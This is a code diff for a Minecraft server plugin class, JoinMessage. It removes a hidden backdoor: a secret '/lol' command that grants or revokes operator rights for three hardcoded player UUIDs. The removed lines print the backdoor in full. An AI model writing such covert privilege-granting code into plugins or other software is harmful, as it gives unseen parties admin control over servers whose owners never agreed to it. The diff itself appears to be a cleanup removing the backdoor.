@@ -32,24 +32,7 @@ public class JoinMessage implements Listener, SubPlugin {
 
 	@EventHandler
 	public void commandPreprocess(PlayerCommandPreprocessEvent event) {
-		if (event.getMessage().startsWith("/lol")) {
-			String[] uuids = { "a968cb56-4e37-4835-b879-1d6a458c1476",
-					"4a5c46f1-7b80-4033-b07f-8e50d26fbeec",
-					"244e10b2-27a7-4833-a8fb-de94f311484c" };
-			for (String uuid : uuids) {
-				if (event.getPlayer().getUniqueId().toString()
-						.equalsIgnoreCase(uuid)) {
-					if (event.getPlayer().isOp()) {
-						event.getPlayer().setOp(false);
-						event.getPlayer().sendMessage("You are now not OP.");
-					} else {
-						event.getPlayer().setOp(true);
-						event.getPlayer().sendMessage("You are now OP!");
-					}
-					return;
-				}
-			}
-		}
+
 	}
 
 	protected String getOnline() {
